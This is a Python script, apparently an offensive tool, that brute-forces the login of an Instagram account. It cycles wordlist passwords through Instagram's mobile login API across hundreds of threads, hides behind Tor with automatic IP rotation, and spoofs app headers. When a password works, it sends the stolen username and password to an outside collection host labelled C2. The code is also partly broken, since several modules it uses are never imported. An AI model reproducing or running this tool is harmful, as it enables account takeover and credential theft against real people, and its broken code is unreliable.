#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests, socks, threading, sys
from stem import Signal
from stem.control import Controller

# CONFIGURATION
TARGET = "victim_username"
PROXY_PORT = 9050
THREAD_COUNT = 420
WORDLIST = "/path/to/wordlist.txt"
PHISH_URL = "https://fake-login-page.xyz/collect.php"

# DYNAMIC VPN ROTATOR
def rotate_tor_ip():
    with Controller.from_port(port=9051) as ctrl:
        ctrl.authenticate(password="OSM_brutal")
        ctrl.signal(Signal.NEWNYM)

# STEALTH AUTHENTICATOR
def insta_bruteforce(password):
    session = requests.session()
    session.proxies = {'http': f'socks5://127.0.0.1:{PROXY_PORT}', 'https': f'socks5://127.0.0.1:{PROXY_PORT}'}
    
    try:
        # PHASE 1: SESSION SPOOFING
        spoof_headers = {
            "X-IG-App-ID": "567067343352427",
            "User-Agent": "Instagram 219.0.0.12.117 Android"
        }
        session.get("https://i.instagram.com/api/v1/si/fetch_headers/", headers=spoof_headers)
        
        # PHASE 2: ENCRYPTED CRED DUMP
        payload = {
            "enc_password": f"#PWD_INSTAGRAM_BROADCAST:0:{int(time.time())}:{password}",
            "username": TARGET,
            "guid": str(uuid.uuid4()),
            "device_id": "android-" + hashlib.md5(str(random.random()).encode()).hexdigest()[:16]
        }
        
        # PHASE 3: BARRAGE MODE
        response = session.post("https://i.instagram.com/api/v1/accounts/login/", data=payload, headers=spoof_headers, timeout=7)
        
        if "logged_in_user" in response.text:
            print(f"\n[!] CRACK SUCCESS: {TARGET}:{password}")
            requests.post(PHISH_URL, json={"user":TARGET, "pass":password})  # BACKUP TO C2
            sys.exit(0)
            
    except: 
        rotate_tor_ip()  # AUTO-VPN ROTATE ON FAILURE

# MAIN THREAD LAUNCHER
if __name__ == "__main__":
    print(open("osm_logo.txt").read())  # DISPLAY ASCII ART
    with open(WORDLIST, "r") as f:
        passwords = [line.strip() for line in f]
    
    while passwords:
        if threading.active_count() < THREAD_COUNT:
            password = passwords.pop(0)
            threading.Thread(target=insta_bruteforce, args=(password,)).start()
